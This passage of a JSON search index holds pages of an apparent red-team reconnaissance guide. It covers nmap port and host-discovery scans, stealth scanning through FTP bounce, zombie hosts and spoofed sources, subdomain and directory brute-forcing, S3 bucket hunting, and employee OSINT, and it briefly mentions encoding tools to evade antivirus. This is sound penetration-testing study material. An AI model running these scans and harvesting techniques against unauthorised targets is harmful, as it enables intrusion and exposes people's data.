    "c": "Host discovery with TCP  Split port scans by port number Low TCP port scans Medium TCP port scans High TCP port scans Split scans  Split the scans to get a set of results back in a shorter period of time. This makes it possible to start testing while the remaining results come back. By the time medium port scans are finished, underlying services of the lower ports have probably been enumerated. Use ports 0-1024 for the low range (System Ports). These scans cover services such as SMTP, Windows File Sharing, HTTP, HTTPS and other commonly found services. For medium port use ports 1025-32767 (the bulk of the User Ports). These cover NFS, Sun RPC Port Mapper, X-Windows, VNC, Microsoft Terminal Services, etc. The high port scans are for ports in the range 32768-65535 (the lesser used User Ports and Dynamic or Ephemeral ports). Hints  Do not ping the target in these scans because there may be filtering in place, which could result in pings failing and nmap accidentally concluding that a host is down. Under the hood  TCP SYN (Stealth) scan ( -sS ) is the default and most popular scan option for good reason. It can be performed quickly, scanning thousands of ports per second on a fast network not hampered by intrusive firewalls. SYN scan is relatively unobtrusive and stealthy, since it never completes TCP connections. It works against any compliant TCP stack, and allows clear, reliable differentiation between open, closed, and filtered states. Nmap starts by sending a TCP packet with the SYN flag set and the target send back a response with the SYN and ACK flags. NMap does not complete the handshake with the expected ACK and the OS suddenly receives a SYN/ACK while it hasn’t requested (NMap did). The OS responds to the unexpected SYN/ACK with an RST packet. All RST packets in such scenarios also have the ACK bit set because they are always sent in response to (and acknowledge) a received packet. Because the three-way handshake is never completed, SYN scan is sometimes called half-open scanning. If a service is listening on a port and someone makes a connection to it (by sending a SYN packet), the service will send a SYN/ACK packet in return. That means that there is a machine at that IP address. Note that some operating systems will respond with a SYN/ACK to SYN s sent to ports used for outbound TCP connections, while others will not. If no service is listening on that port but the machine is up and running and on the network, a reset ( RST ) packet will be sent back. That means there is nothing listening on that port, but having sent something in return means that a machine is at that IP address. If nothing is received after sending a SYN packet, it means there is no host at that IP address OR a firewall is blocking traffic OR the host is down. Port 80 is therefore extremely useful for ping sweeps, because most firewalls and port filters do not block web traffic. Send Receive Send Assumption SYN SYN/ACK ACK followed by RST Port is open, host is up SYN RST - Port is closed, host is up SYN Nothing - Port is blocked by firewall, host is down, or there is no host at that IP address. Interpreting portscan outputs  Some puzzling with indicators will help: Anything from 40000 onwards could be anything and only be temporary NFS can run on any port, but the Linux NFS Kernel server implementation always runs on port 2049 by default. VNC clients typically are on port 5900+ If port 5900 AND 5901 are open, most likely 5901 is a second VNC service. If port 5901 is open and 5900 closed, who knows? TCP port 8080 open can indicate a proxy server, or something like Apache Tomcat, or … A Windows Active Directory controller will have TCP ports 53 (DNS), 88 (Kerberos), 389 (LDAP), 636 (LDAP/S) and the common NetBIOS and Windows File Sharing ports 135 (used for RPC comms for AD replication), 139 (Authentication) and 445 (used for a whole host of services including file sharing and authentication) Windows systems tend to use TCP port 3389 for Microsoft Remote Desktop Protocol access. Unix-like systems often use text-based protocols on TCP ports 22 (SSH), 23 (Telnet) and 514 (RSH), or network-based Windowing protocols on TCP ports such as 590x (VNC) or 600x (X11). Examples  Low TCP port scans: # nmap -sS -PN -p 0-1024 -n -iL $TARGETFILE -oA nmap/tcp-lo The result is an open port list, with port and protocol, the port’s state and the by IANA allocated service for that port. This does not mean that a port actually runs that service. Medium TCP port scans: # nmap -sS -PN -p 1025-32767 -n -iL $TARGETFILE -oA nmap/tcp-med Remaining TCP port scans: # nmap -sS -PN -p 32768-65535 -n -iL $TARGETFILE -oA nmap/tcp-hi Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "9eeb2329002066a0902a656ee46d6c70",
    "u": "https://recon.tymyrddin.dev/docs/physical/facilities",
    "t": "Recon of facilities ",
    "c": "Recon of facilities  Organisations can use a number of physical security controls to regulate who gains access to the facility or what areas in the facility they gain access to. See if you can bypass the security to gain access to areas of facilities you should not have access to. Resources  Guidelines for Performing Physical Security Tests on Facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "439632600c2c42ec4725efa6ef2a8c2e",
    "u": "https://recon.tymyrddin.dev/docs/cloud/s3-urls",
    "t": "Investigating AWS S3 URLs ",
    "c": "Investigating AWS S3 URLs  Endpoints  S3 endpoint is a region-specific URL that is used in both S3 URL styles. Most of the endpoints follow this pattern (with region names being eu-west-1 , us-west-2 , etc): s3-REGION.amazonaws.com And there are some oddities useful to know. Two endpoints that do not follow the above pattern are those of the us-east-1 region. For that region endpoints are synonyms and both point to the same place: s3.amazonaws.com s3-external-1.amazonaws.com Further, the eu-central-1 (Frankfurt) and ap-northeast-2 (Seoul) regions both have one endpoint that follows the general pattern and one alias endpoint that differs from the general scheme in one symbol (the first dash is replaced by dot): s3-eu-central-1.amazonaws.com s3.eu-central-1.amazonaws.com s3-ap-northeast-2.amazonaws.com s3.ap-northeast-2.amazonaws.com S3 bucket URL schemes  According to the S3 Developer Guide (PDF, p.57), S3 supports both virtual-hosted and path URL styles for bucket access. Path style URL  In path style URL, the bucket name is appended to the domain name and is a part of the URL path: http://s3endpoint/<bucket-name> Virtual-hosted style URL  In virtual-hosted style URL the bucket name becomes a subdomain: http://BUCKET.s3endpoint Static Website Hosting Endpoints  Using S3’s Static Website Hosting feature requires using Website Endpoints. There are two general forms of S3 website endpoint: http://BUCKET.s3-website-region.amazonaws.com http://BUCKET.s3-website.region.amazonaws.com Most of the regions follow the first form, while eu-central-1 and ap-northeast-2 follow the second. Presigned URL  Users can create a presigned URL for an object, for which security credentials, a bucket name, an object key, an HTTP method (GET to download the object), and an expiration date and time are given. The presigned URLs are valid only for the specified duration. If a presigned URL is made using a temporary token, then the URL expires when the token expires, even if the URL was created with a later expiration time. Anyone who receives the presigned URL can then access the object. Because presigned URLs grant access to the Amazon S3 buckets to whoever has the URL, Amazon recommends they be protected appropriately . Something often forgotten, apparently. Getting it, but not quite.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "117bf72c53eedd74731f47621540303a",
    "u": "https://recon.tymyrddin.dev/docs/cloud/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Cloud recon. Focus on S3 first. The growing number of Amazon Web Services S3 “data leaks” are due to human intervention – specifically, users who have not correctly configured S3 bucket policies, and as a result, allow public access to S3. In general, a lack of understanding when implementing S3, or carelessness when evaluating what should or should not be available for public consumption. Why?  To gain information for initial access in the cloud. How?  Mapping endpoints and plan Investigating AWS S3 URLs",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "99f2c2f99f7d5f85c1898215c9e40a69",
    "u": "https://recon.tymyrddin.dev/docs/api/secrets",
    "t": "Check for exposed secrets ",
    "c": "Check for exposed secrets  The authentication mechanism is used to identify the user and ensure that they are authorized to access the API. The authentication mechanism is usually a username and password, but it can also be a token or a certificate. It also gives clues to potential vulnerabilities in the API. If the authentication mechanism is weak, then the API is more vulnerable to attack. Resources  API Security Top 10",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "dd3825e3f3fb61448b666dffc1f7a801",
    "u": "https://recon.tymyrddin.dev/docs/app/techstack",
    "t": "Tech stack fingerprinting ",
    "c": "Tech stack fingerprinting  Fingerprinting techniques can help you understand the target application even better. Fingerprinting is identifying the software brands and versions that a machine or an application uses. This information allows you to perform targeted attacks on the application, because you can search for any known misconfigurations and publicly disclosed vulnerabilities related to a particular version. Run Nmap on a machine with the -sV flag on to enable version detection on the port scan. In Burp, send an HTTP request to the server to check the HTTP headers used to gain insight into the tech stack. Many web frameworks or other technologies will embed a signature in source code. Right-click a page, select View Source Code , and press CTRL-F to search for phrases like powered by , built with , and running . Check technology-specific file extensions, filenames, folders, and directories. Wappalyzer is a browser extension that identifies content management systems, frameworks, and programming languages used on a site. BuiltWith is a website that shows you which web technologies a site is built with. StackShare is an online platform that allows developers to share the tech they use. Maybe the organisation’s developers have posted their tech stack. And Retire.js is a tool that detects outdated JavaScript libraries and Node.js packages.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8a266ac0d06711e4fbb3260fc2906110",
    "u": "https://recon.tymyrddin.dev/docs/scanning/stealth",
    "t": "Stealth scans ",
    "c": "Stealth scans  Stealth  Never use connect scan ( -sT ), which establishes a full connection to a port, if one wishes to remain stealthy. Excessive port connections can create a DoS condition on older boxes, and will raise the alarms on any IDS. Use a stealthy port-scanning method with nmap, such as a TCP SYN scan (sometimes called a half-open scan). It is not only stealthy, it is also lighter on both systems, source and target. Mask your IP from the target (Don’t expect to find possibilities for either of these two all the time, but do keep looking, especially among older systems not offering useful services.): Use an FTP bounce scan if possible. Some ftp servers allow anonymous users to proxy connections to other systems. If you find an anonymous ftp server during enumeration, or you know of one to which you have login credentials, try using the -b option with user:pass@server:ftpport . If the server does not require authentication, you can skip the user:pass and if it is running on the standard port you can also leave out the ftpport part. This only works on some ftp servers. Many ftp servers today have this option disabled (by default). Idle scan gives a similar result but uses a different type of scanning. If you can identify an intermediate machine (a zombie) with low traffic and predictable fragment identification values (IP ID) you can send spoofed packets to your target, with the source set to the zombie with -sI zombiehost:port . An IDS will see the idle scan target as the system doing the scanning. If the idle target is a by your target trusted machine that can bypass host-based access control lists, jackpot!",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "6342ea6759dd923f27e88734c46e6acf",
    "u": "https://recon.tymyrddin.dev/docs/app/stroll",
    "t": "Manually walk through the target ",
    "c": "Manually walk through the target  Manually walk through the application to learn more about it. Try to uncover every feature in the application that users can access by browsing through every page and clicking every link. Access the functionalities that you don’t usually use. Get a rough idea of what the attack surface (all the different points at which an attacker can attempt to exploit the application) looks like, where the data entry points are, and how different users interact with each other. Then you can start a more in-depth recon process: finding out the technology and structure of an application.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "e6271cfa9c8df69dc86ca8854add5e18",
    "u": "https://recon.tymyrddin.dev/docs/scanning/icmp",
    "t": "Host discovery with ICMP ",
    "c": "Host discovery with ICMP  The easiest and fastest way to discover if a host is up or not is by trying to send some ICMP packets. Send an echo request using a simple ping or fping (for ranges). If pinging a single host works, try a ping-sweep: Send out ICMP echo requests to every system on a particular network or subset of a network to determine which hosts are up. ICMP error messages can be used to mask the source of a Distributed Denial of Service attack, and with such attacks being common, ICMP error rate limiting is often applied. To avoid filters to common ICMP echo request-response, use nmap to send other types of ICMP packets. If scans still take incredibly long, try discovering hosts with a SYN scan or UDP scan instead. Examples  Send a single echo request # ping -c 1 192.168.122.10 Send echo requests to ranges: # fping -g 192.168.122.0/24 Using nmap, send echo, timestamp requests and subnet mask requests: # nmap -PEPM -sP -n 192.168.122.0/24",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "669a9cd0954ec976c9347b7e46848a15",
    "u": "https://recon.tymyrddin.dev/docs/scanning/hosts",
    "t": "Live host discovery ",
    "c": "Live host discovery  Types of scans  ARP, ICMP, TCP, and UDP can detect live hosts. Any response from a host is an indication that it is online. Scan Type Example Command ARP Scan sudo nmap -PR -sn /24 ICMP Echo Scan sudo nmap -PE -sn /24 ICMP Timestamp Scan sudo nmap -PP -sn /24 ICMP Address Mask Scan sudo nmap -PM -sn /24 TCP SYN Ping Scan sudo nmap -PS22,80,443 -sn /30 TCP ACK Ping Scan sudo nmap -PA22,80,443 -sn /30 UDP Ping Scan sudo nmap -PU53,161,162 -sn /30 Options  Option Purpose -n no DNS lookup -R reverse-DNS lookup for all hosts -sn host discovery only",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "c795c53795ef1db0037e6f7bdcee1f11",
    "u": "https://recon.tymyrddin.dev/docs/api/collect-data",
    "t": "Collect data ",
    "c": "Collect data  Collect data from applications through automated and manual means. Scan for open ports and services using shodan Use an application as intended Inspect web application with DevTools Search for API-related directories Discover API endpoints From here: an entry point (typically using the root URI of “/”) contains links to other REST APIs. Those APIs will contain links to other APIs and so on. Ideally, there is no API that does not have a link to it. Tools  Kiterunner Nikto OWASP ZAP",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "0aa1ce3d047d15d68e4a4414feb546fc",
    "u": "https://recon.tymyrddin.dev/docs/scanning/udp",
    "t": "Host discovery with UDP ",
    "c": "Host discovery with UDP  Split port scans by port number Low UDP port scans Remaining UDP port scans Relationship with ICMP  UDP is a stateless protocol. It was designed for applications that do not care whether a packet is received. This could saturate a link, and ICMP is used in its congestion control. Because UDP is stateless, it is easy to spoof using ICMP error messages to mask the source of a Distributed Denial of Service attack, and with such attacks common, UDP scans are considered bad and ICMP error rate limiting good. With 65,535 ports to scan and error rate limits of 1 ICMP message per second, it can take 9+ hours to scan some hosts. Solutions are scanning multiple hosts in parallel, scanning popular ports first, and ignoring ports that require specific protocols and scanning those separately. Older versions of Windows (and some configurations of current Windows systems) do not implement ICMP error rate limiting. Knowing beforehand which are Windows systems, these can be put on a separate IP list. Not responding  UDP services are highly unlikely to respond to a regular empty UDP probe datagaram because the underlying application does not receive a packet that causes it to respond. The solution is to send a packet related to the most likely service (based on port number) running under it. For example, brute forcing SNMP on port 161 could be worthwhile and sending a correctly formed DNS query datagram to UDP port 53 will likely give a useful response. Interpreting portscan outputs  nmap will report a lot of closed ports, and some as open|filtered . The latter means that nmap did not receive a response. Use a combination of ICMP and IP to whittle things down: An open port will respond to a correctly formed application message if the service is supposed to respond to that message A closed port will lead to an ICMP port unreachable from the device (or a similar destination unreachable message from a nearby device) A filtered port will occasionally result in a message, but more often than not, nothing If a packet’s TTL expires an ICMP TTL Expired In Transit message is sent from the router the datagram is currently passing through to the packet’s source Examples  Low UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 0-1024 -oA nmap/udp-lo -sV Expect to find 53, 111 and 137 open. Remaining UDP port scans: # nmap -sU -PN -n -iL $TARGETFILE -p 1025-65535 -oA nmap/udp-full -sV Expect to find Sun RPC services or DCE RPC services, 3rd-party backup utilities, and application services with SAP deployments.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5b01e41888e428481743749b796e42f7",
    "u": "https://recon.tymyrddin.dev/docs/scanning/ports",
    "t": "Port scanning ",
    "c": "Port scanning  Types of scans  Port Scan Type Example Command TCP Connect Scan nmap -sT TCP SYN Scan sudo nmap -sS UDP Scan sudo nmap -sU TCP Null Scan sudo nmap -sN TCP FIN Scan sudo nmap -sF TCP Xmas Scan sudo nmap -sX TCP Maimon Scan sudo nmap -sM TCP ACK Scan sudo nmap -sA TCP Window Scan sudo nmap -sW Custom TCP Scan sudo nmap --scanflags URGACKPSHRSTSYNFIN Spoofed Source IP sudo nmap -S SPOOFED_IP Spoofed MAC Address --spoof-mac SPOOFED_MAC Decoy Scan nmap -D DECOY_IP,ME Idle (Zombie) Scan sudo nmap -sI ZOMBIE_IP Fragment IP data into 8 bytes -f Fragment IP data into 16 bytes -ff Options  Option Purpose -p- all ports -p1-1023 scan ports 1 to 1023 -F 100 most common ports -r scan ports in consecutive order -T<0-5> T0 being the slowest and T5 the fastest --max-rate 50 rate <= 50 packets/sec --min-rate 15 rate >= 15 packets/sec --min-parallelism 100 at least 100 probes in parallel --source-port PORT_NUM specify source port number --data-length NUM append random data to reach given length Null, FIN, and Xmas scan provoke a response from closed ports, while Maimon, ACK, and Window scans provoke a response from open and closed ports. Option Purpose --reason explains how Nmap made its conclusion -v verbose -vv very verbose -d debugging -dd more details for debugging",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "682e6c01de9ffba0dd3f030fb4db3374",
    "u": "https://recon.tymyrddin.dev/docs/app/dns",
    "t": "Scope discovery ",
    "c": "Scope discovery  Gather deeper and wider Discover websites on the same server Discover subdomains Discover email addresses Discover sensitive files WHOIS and Reverse WHOIS  Use whois to gather Domain name, IP address, Administrative Details, autonomous system number, DNS Go to www.arin.net/whois and search for target name in the ARIN Whois/RDAP Search bar. Find a handle which displays more information about this registration including the range of IP addresses. Find an entry with a net range (public IPs). Determine all the public IP blocks the target may have. If you cannot find any results try some other Whois database search sites. IP addresses  nslookup www.target.com Setting the type of query to MX (mail exchange) records: nslookup set type=MX target.com Then use nslookup again to resolve the FQDNs of the mail servers to IP adressess. Try a DNS zone transfer: nslookup server <ip_or_fqdn_of_target_DNS_server> set type=all ls -d <target_domainname> If successful, make a note of it and add it to the remediation list in the pentest report. Researching certificates  Another way of finding hosts is to take advantage of the Secure Sockets Layer(SSL) certificates used to encrypt web traffic. An SSL certificate’s Subject Alternative Name field lets certificate owners specify additional hostnames that use the same certificate, so you can find those hostnames by parsing this field. Use online databases like crt.sh , Censys , and Cert Spotter to find certificates for a domain. 👉 Wildcard certificates are a single point of failure. If we stumble upon the private key while roaming the network, we could intercept the communication flow of all applications using that same parent domain. When a certificate authority issues a certificate, these are entered into a central repository called a certificate log. This repository keeps a binary tree of all certificates, where each node is the hash of its child nodes, thereby guaranteeing the integrity of the entire chain. All issued TLS certificates should be publicly published to detect domain spoofing, typo-squatting, homograph attacks, and other mischievous ways to deceive and redirect users. These logs can be searched. Secret applications with little security hiding behind proxies can be exposed, and minimally subdomain enumeration is way faster. Subdomain enumeration  After finding as many domains on the target as possible, locate as many subdomains on those domains as you can. Each subdomain represents a new angle for attacking the network. The best way to enumerate subdomains is to use automation. Tools like Sublist3r , SubBrute , Amass , and Gobuster can enumerate subdomains automatically with a variety of wordlists and strategies. For example, Sublist3r works by querying search engines and online subdomain databases, while SubBrute is a brute-forcing tool that guesses possible subdomains until it finds real ones. Amass uses a combination of DNS zone transfers, certificate parsing, search engines, and subdomain databases to find subdomains. You can build a tool that combines the results of multiple tools to achieve the best results. Service Enumeration  Next, enumerate the services hosted on the machines you’ve found. Since services often run on default ports, a good way to find them is by port-scanning the machine with either active or passive scanning. In active scanning, you directly engage with the server. Active scanning tools send requests to connect to the target machine’s ports to look for open ones. You can use tools like nmap or masscan for active scanning. In passive scanning, third-party resources are in use to learn about a machine’s ports without interacting with the server. Passive scanning is stealthier and helps attackers avoid detection. To find services on a machine without actively scanning it, you can use Shodan , Censys and Project Sonar . Combine the information gathered from different databases for the best results. Enumerate webserver directories  The next thing you can do to discover more of the site’s attack surface is brute-force the directories of the web servers you’ve found. Finding directories on servers is valuable, because through them, you might discover hidden admin panels, configuration files, password files, outdated functionalities, database copies, and source code files. Directory brute-forcing can sometimes allow you to directly take over a server. Even if you can’t find any immediate exploits, directory information often tells you about the structure and technology of an application. The nmap NSE script http-enum.nse offers a quite extensive fingerprint, especially when including Nikto database, but there are no guarantees all will be seen. And Nikto is very noisy. You can use Dirsearch or Gobuster for directory brute-forcing. These tools use wordlists to construct URLs, and then request these URLs from a web server. If the server responds with a status code in the 200 range, the directory or file exists. This means you can browse to the page and see what An example of running a Dirsearch command. The -u flag specifies the hostname, and the -e flag specifies the file extension to use when constructing URLs: ./dirsearch.py -u target_url -e php Gobuster’s dir mode can be used to find additional content on a specific domain or subdomain. This includes hidden directories and files. In this mode, you can use the -u flag to specify the domain or subdomain you want to brute-force and -w to specify the wordlist you want to use: gobuster dir -u target_url -w wordlist Manually visiting all the pages you’ve found through brute-forcing can be time-consuming. Instead, use a screenshot tool like EyeWitness or Snapper to automatically verify that a page is hosted on each location. EyeWitness accepts a list of URLs and takes screenshots of each page. In a photo gallery app, you can quickly skim these to find the interesting-looking ones. Keep an eye out for hidden services, such as developer or admin panels, directory listing pages, analytics pages, and pages that look outdated and ill-maintained. These are all common places for vulnerabilities to manifest. Spidering the site  Another way of discovering directories and paths is through web spidering, or web crawling, a process used to identify all pages on a site. A web spider tool starts with a page to visit. It then identifies all the URLs embedded on the page and visits them. By recursively visiting all URLs found on all pages of a site, the web spider can uncover many hidden endpoints in an application. OWASP Zed Attack Proxy (ZAP) has a built-in web spider, and Burp Suite has an equivalent tool called the crawler. Third-party hosting  Take a look at the company’s third-party hosting footprint. For example, look for the organisation’s S3 buckets. A way to find those is through Google dorking. site:s3.amazonaws.com COMPANY_NAME site:amazonaws.com COMPANY_NAME If the company uses custom URLs for its S3 buckets, try more flexible search terms instead. Companies often still place keywords like aws and s3 in their custom bucket URLs: amazonaws s3 COMPANY_NAME amazonaws bucket COMPANY_NAME amazonaws COMPANY_NAME s3 COMPANY_NAME Another way of finding buckets is to search a company’s public GitHub repositories for S3 URLs. Try searching these repositories for the term s3 . GrayhatWarfare is another online search engine you can use to find publicly exposed S3 buckets. And you can try to brute-force buckets by using keywords. Lazys3 is a useful tool for that. It relies on a wordlist to guess buckets that are permutations of common bucket names. Bucket Stream parses certificates belonging to an organisation and finds S3 buckets based on permutations of the domain names found on the certificates. Bucket Stream also automatically checks whether the bucket is accessible. Once you’ve found a couple of buckets that belong to the target organisation, use the AWS command line tool to see if you can access one. Install the tool with: pip...",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "96231753af2d5325a33d6b571575598f",
    "u": "https://recon.tymyrddin.dev/docs/physical/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gather information to create an operations plan. In some cases, the client will provide much of the information, like vendors used, photographs of the locations, floorplans, front desk procedures, dress codes, photos of badges, security systems in place. If not, do recon. Why?  Identify vulnerabilities and weaknesses in physical security controls. How?  Passive reconnaissance Recon of facilities",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "5a05f62e88cc94afbe9f6b33a26b11d7",
    "u": "https://recon.tymyrddin.dev/docs/api/burp",
    "t": "Analyse traffic ",
    "c": "Analyse traffic  Pass web service application traffic through a proxy to gather more detail. Using a proxy helps dig into a website and look for vulnerabilities. FoxyProxy is a Firefox extension for switching an internet connection between proxy servers based on URL patterns. It simplifies configuring browsers to access proxy servers. Burp Suite is a popular penetration testing and vulnerability finder tool for checking web application security. To discover hidden flaws, route traffic through a proxy like Burp Suite. FoxyProxy can be used to turn it on and off.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "f4610429197f0979ce6050fa01a81bc3",
    "u": "https://recon.tymyrddin.dev/docs/api/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Locate the APIs and validate whether they are operational, find credential information (keys, secrets, usernames, passwords), version information, API documentation, and information about the API’s purpose. Why?  The more information gathered about a target, the better the odds of discovering and exploiting API-related vulnerabilities. How?  Collect data Understand application functionality Analyse traffic Document key parameters Check for exposed secrets",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "8ba3d3d5b3212810790cf7755baf5a35",
    "u": "https://recon.tymyrddin.dev/docs/app/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Recon strategies for gathering intel on a target. Why?  To discover all the possible ways of attacking a target before deciding on the most effective approach for web application hacking. How?  Manually walk through the target Scope discovery Other sneaky OSINT techniques Tech stack fingerprinting",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "3b4558c53e32c537879a01783be1762d",
    "u": "https://recon.tymyrddin.dev/docs/scanning/diving",
    "t": "Diving deeper in discovery ",
    "c": "Diving deeper in discovery  Identify live networks between source and already identified subnets Traceroute to the gateway or DNS server for each network Add newly identified networks to the list of subnets Discover the IP addresses of servers behind a DNS Discover how long a server has been up Where is a server’s physical location … Under the hood  Traceroutes work by manipulating the Time-To-Live (TTL) field in an IP packet. This field tells a device a packet is passing through how many more systems (or hops) a packet can pass through before being dropped. This is to ensure that lost packets do not just simply hop around the Internet forever and eventually, with enough lost packets clogs it up. The field is decremented as it passes through each network hop. When it reaches zero, a router will drop the packet being sent through it and send an ICMP Time-To-Live exceeded message back to the source. This can be used to determine the route to a host or network, the time it takes for a message to be sent and a response to be received by using a traceroute, which service provider the target is using There is an ICMP traceroute (tracert.exe, Windows) and a UDP traceroute (traceroute -l, all other OSs). ICMP traceroute expects all intermediary routers to respond with an ICMP TTL Exceeded message. Most do not (RFC 792) UDP traceroute is not so great where filtering is in place. Most Unix traceroute implementations now support TCP static port traceroutes out of the box. Mapping out DMZ and internal networks  Because all traceroutes work using ICMP TTL Exceeded messages, which protocol is used is not important as long as there is a known response. Use a TCP traceroute with a SYN flag set, and commonly open ports such as 25, 80 or 443 for which you can get a reliable response back once the target is reached. Uptime  Each time a server is patched or updated, it must also be rebooted. If a server has been up for a long time, we know it has not been patched or updated in that time, and that it will be vulnerable to all vulnerabilities discovered during that timeframe. Examples  Traceroute in nmap with Geo resolving: nmap --traceroute --script traceroute-geolocation.nse -p 80 [ip_or_hostname] The default packet which hping3 will create is a TCP packet: # hping3 -T -V --tr-stop -S -p 80 [ip_or_hostname] Specify the source and destination ports of the packet to help it bypass the firewall. Send three packets out ( -c ) to destination port 53 ( -p ) and set the SYN flag in the packet, so it looks like the first phase of the three-way handshake ( -S ): hping3 -c 3 -p 53 -S [ip_or_hostname] Traceroute in hping3 using a TCP scan to a specific destination port: # hping3 --traceroute --verbose --syn --destport [80] [ip_or_hostname] Discover the IP addresses of servers behind a DNS: # hping3 [big site hostname] -S -p 80 -T –ttl 13 –tr-keep-ttl -n Uptime of a server: # hping3 [ip_or_hostname] -p 80 –tcp-timestamp -S -c 4",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "77bef2e609a2bbb9d38d4b3ba1cf60fb",
    "u": "https://recon.tymyrddin.dev/docs/app/sneaky",
    "t": "Other sneaky OSINT techniques ",
    "c": "Other sneaky OSINT techniques  Engineering job listings often reveal the technologies the company uses. If you can’t find relevant job posts, search for employees’ profiles on LinkedIn, and read employees’ personal blogs or their engineering questions on forums like Stack Overflow and Quora. People’s work calendars often contain meeting notes, slides, and sometimes even login credentials. If an employee shares their calendars with the public by accident, you could gain access to these. The organisation or its employees’ social media pages might also leak valuable information. Like a sets of valid credentials on Post-it Notes visible in the background of office selfies??? If the company has an engineering mailing list, sign up for it to gain insight into the company’s technology and development process. Check for SlideShare or Pastebin accounts. Consult archive websites like the Wayback Machine . Tomnomnom’s tool Waybackurls can automatically extract endpoints and URLs from the Wayback Machine.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "563d3df639de5cc87ce98241d343a8a5",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/readme",
    "t": "Introduction ",
    "c": "Introduction  What?  Gathering information about a target system that can be used to execute a successful attack. To get this information, use various methods with variant tools. Why?  Analyse the security posture of the target and find loopholes for creating an attack plan. Using different tools and techniques, narrow down the range of IP addresses. Use the collected information to identify weaknesses in the target’s security. Graphically represent the target’s network, so it can be used as a guide during the attack. How?  Gather network information Gather system information Collect organisation information",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "07424d82724b1a48d202f4f49f538fd1",
    "u": "https://recon.tymyrddin.dev/docs/api/functionality",
    "t": "Understand application functionality ",
    "c": "Understand application functionality  Enumerate the endpoints and identify the parameters that can be used to call the API. Use a tool like Postman to send requests to the API and see the response. Review the API documentation. This will help understand the functionality of the API and identify the attack surface. Resources  Using SOAP requests",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "17d2dcae1d0a060e2a5976096aaad82d",
    "u": "https://recon.tymyrddin.dev/docs/footprinting/organisation",
    "t": "Collect organisation information ",
    "c": "Collect organisation information  Employee information Organisation’s background Phone numbers Locations Advanced searches  Search engines can be used to gather information about the target organisation. Search results can include , and other information that could be useful. Search engines crawl the world wide web day and night to index new web pages and files. Sometimes this can lead to indexing confidential information: Information about employees Intranet information Login pages Documents for internal company use Confidential spreadsheets with usernames, email addresses, and even passwords Files containing usernames Sensitive directories Service version number (some of which might be vulnerable and unpatched) Error messages Google dorking  Google dorking is a technique which involves using a set of search operators and building complex queries. The operators that are used in Google hacking are called dorks. Email footprinting  Email footprinting involves collecting information from emails by monitoring the email delivery and inspecting the headers: IP address of the recipient Geolocation of the recipient Delivery information Visited links Browser and OS information Reading time Email headers contain information about the sender, subject, and recipient. All this information is valuable to hackers when planning to attack their target. Information contained in email headers include: Sender’s name IP/Email address of the sender Mail server Mail server authentication system Send and delivery stamp Unique number of the message Email tracking tools have the capability of tracking emails and inspecting their headers to extract useful information. The sender is notified of the email being delivered and opened by the recipient. Assets discovery  Assets discovery involves collecting all the company names owned by a main company and then all the assets of these companies: Find the acquisitions of the main company, this will give the companies inside the scope. Find the ASN (if any) of each company, this will give the IP ranges owned by each company. Use reverse whois lookups to search for other entries (organisation names, domains…) related to the first one (recursively). Shodan and SSL filters can be used to search for other assets (the SSL trick can be done recursively). Investigating social media  The private world of yesterday is now an online world. Everyone with a search engine has open access to social networks, government databases, and public records. Social media websites have become very popular for not only personal use but also for corporate use. Some social media platforms can reveal tons of information about the target. This is especially true as many users tend to overshare details about themselves and their work. To name but a few, it’s worthwhile checking the following: LinkedIn Twitter Facebook Instagram Google groups Social media scraping can automate discovering names, email addresses, phone numbers, biographies. Visit job listing sites  Job advertisements can also tell a lot about an organisation. In addition to revealing names and email addresses, job posts for technical positions could give insight into the target’s systems and infrastructure. The popular job posts might vary from one country to another. Make sure to check job listing sites in the countries where the target would post their ads. And it is always worth checking their website for any job opening and seeing if this can leak any interesting information.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "106e87e4f24df095e7d4f2ad32baaf0a",
    "u": "https://recon.tymyrddin.dev/docs/scanning/defence",
    "t": "Defence detection ",
    "c": "Defence detection  Check to see if a target is using a load balancing solution with the lbd (load balancing detector) command. To determine if the target is behind a web application firewall (WAF), use the wafw00f command. It may be needed to encode some attack tools to try to trick antivirus software into not seeing the code as being harmful. To detect what ports a firewall is forwarding on to a target, use the firewalk command. Is also available for nmap as firewalk.nse script.",
    "cat": "red_in",
    "type": "html"
  },
  {
    "objectID": "aba9d1f5df203926b310557f55850f83",
    "u": "https://recon.tymyrddin.dev/docs/scanning/war-dialing-driving-flying-shipping",
    "t": "War-dialing-driving-flying-shipping ",
